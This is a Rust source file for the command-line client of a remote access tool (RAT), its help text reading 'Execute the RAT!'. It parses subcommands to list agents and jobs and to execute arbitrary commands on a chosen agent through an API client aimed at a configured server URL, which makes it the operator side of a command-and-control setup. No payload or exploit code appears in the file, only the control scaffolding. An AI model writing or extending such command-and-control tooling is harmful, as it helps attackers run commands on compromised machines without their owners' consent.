mod cli;
mod error;
mod config;
mod api;
use clap::{Arg, Command};

pub use error::Error; //double check

fn main() -> Result<(), anyhow::Error> {
    let cli = Command::new(clap::crate_name!())
        .version(clap::crate_version!())
        .about(clap::crate_description!())
        .subcommand(Command::new(cli::AGENTS).about("List all agents!"))
        .subcommand(Command::new(cli::JOBS).about("List aLL Jobs!"))
        .subcommand(
            Command::new(cli::EXEC).about("Execute the RAT!")
            .arg(Arg::new("agent").short('a').long("agent")
                .help("Agent ID to execute command on.")
                .takes_value(true)
                .required(true)
            )
            .arg(Arg::new("command")
                .help("The command to execute with its provided arguments.")
                .required(true)
                .index(1),
            ),
        )
        .arg_required_else_help(true)
        .get_matches();

    let api_client = api::Client::new(config::SERVER_URL.to_string());

    if let Some(_) = cli.subcommand_matches(cli::AGENTS) {
        cli::agents::run(&api_client)?;
    } else if let Some(_) = cli.subcommand_matches(cli::JOBS) {
        cli::jobs::run(&api_client)?;
    } else if let Some(matches) = cli.subcommand_matches(cli::EXEC) {
        let agent_id = matches.value_of("agent").unwrap();
        let command = matches.value_of("command").unwrap();
        cli::exec::run(&api_client, agent_id, command);
    }

    Ok(())
}
